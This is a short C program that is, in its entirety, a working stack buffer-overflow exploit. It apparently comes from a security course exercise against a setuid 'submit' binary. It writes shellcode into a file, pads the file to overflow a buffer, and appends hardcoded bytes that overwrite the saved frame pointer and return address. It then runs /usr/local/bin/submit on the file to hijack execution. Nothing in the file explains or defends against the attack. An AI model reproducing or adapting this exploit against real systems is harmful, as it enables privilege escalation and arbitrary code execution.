#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "shellcode.h"
// shellcode[] is in 0x8049940

#define TARGET "/usr/local/bin/submit"
//#define TARGET "/home/user/submit"


static char rewrite[] = 
//"\x67\x40\x99\x04\x08";
"\x63\x88\xde\xbf\xff\xd4\xd2\xbf\xff";


int main(void) {
	char *args[4];
	char *env[1];
	int i,len;

	FILE *my_file;
	my_file = fopen("my_file.exe","w");

	// fill the my_file
	fprintf(my_file, shellcode);
	len = strlen(shellcode);
	for(i = len; i < 2400; i++) {
		fputc('a', my_file);
	}

	// overwrtie counter, ebp, eip
	for(i = 0; i < strlen(rewrite); i++) {
		fputc(rewrite[i], my_file);
	}
	
	fclose(my_file);

	args[0] = TARGET;
	args[1] = "my_file.exe";
	args[2] = "message";
	args[3] = NULL;

	env[0] = NULL;

	execve(TARGET, args, env);
	// execve returns if fails
	fprintf(stderr, "execve failed\n");

	return 1;
}
